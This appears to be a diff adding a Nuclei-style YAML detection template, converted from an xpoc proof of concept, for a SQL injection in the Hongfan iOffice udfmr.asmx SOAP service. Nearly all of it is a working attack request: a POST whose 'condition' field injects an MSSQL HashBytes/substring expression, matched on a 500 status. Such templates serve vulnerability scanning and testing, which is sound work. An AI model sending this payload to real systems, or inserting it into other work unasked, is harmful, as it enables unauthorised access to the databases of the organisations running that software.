@@ -1,0 +1,24 @@
+id: yaml-poc-hongfan-ioffice-sql_injection-CT-469718
+info:
+  name: Yaml Poc Hongfan Ioffice Sql_Injection Ct 469718
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-hongfan-ioffice-sql_injection-CT-469718'
+  tags: sqli
+  reference: []
+http:
+- method: POST
+  path:
+  - /iOffice/prg/set/wss/udfmr.asmx
+  body: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<soap:Envelope xmlns:xsi=\"\
+    http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\
+    \ xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n<soap:Body>\r\n\
+    <GetEmpSearch xmlns=\"http://tempuri.org/ioffice/udfmr\">\r\n<condition>1=substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','{{a}}')),3,32)</condition>\r\
+    \n</GetEmpSearch>\r\n</soap:Body>\r\n</soap:Envelope>"
+  headers:
+    Content-Type: text/xml; charset=utf-8
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 500
